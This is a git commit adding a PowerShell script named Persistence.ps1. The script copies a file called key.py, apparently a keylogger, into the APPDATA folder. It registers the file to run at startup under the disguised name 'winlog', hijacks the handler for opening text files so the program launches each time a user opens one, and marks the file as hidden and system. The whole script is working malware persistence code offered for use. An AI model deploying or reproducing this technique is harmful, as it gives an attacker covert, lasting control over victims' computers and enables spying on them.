c30e25aa3d5bc906c971f413c48fa9be9b745a60
xp4xbox <nicman1080@gmail.com>
2017-09-15 22:23:59 -0400

    Create Persistence.ps1

---
+++ Persistence/Persistence.ps1
@@ -0,0 +1,23 @@
+# NOTE: If text files are associated with something other than notepad, this will override it.
+# You will also need to compile file as .exe
+
+# Set the file name as your .exe
+$strFileName = "key.py"
+
+$strScriptPath = $MyInvocation.MyCommand.Path; $strDirScriptPath = Split-Path $strScriptPath
+Set-Location -Path $strDirScriptPath
+
+$APPDATA = "$env:APPDATA"
+
+# Copy file to appdata folder
+If (test-path "$APPDATA\$strFileName") {Remove-Item "$APPDATA\$strFileName" -Force}
+Copy-Item $strFileName $APPDATA -Force
+
+# make program run at startup
+New-ItemProperty -path HKLM:\Software\Microsoft\Windows\CurrentVersion\Run -name winlog -PropertyType String -value $APPDATA\$strFileName -Force
+
+# make program open anytime a user opens a text file
+New-ItemProperty -path HKLM:\Software\Classes\txtfile\shell\open\command -name "(Default)" -PropertyType ExpandString -value "$APPDATA\$strFileName %1" -Force
+
+# set attributes to be a system file and a hidden file
+$objGetFile=Get-Item $APPDATA\$strFileName; $objGetFile.Attributes = 'System, Hidden'
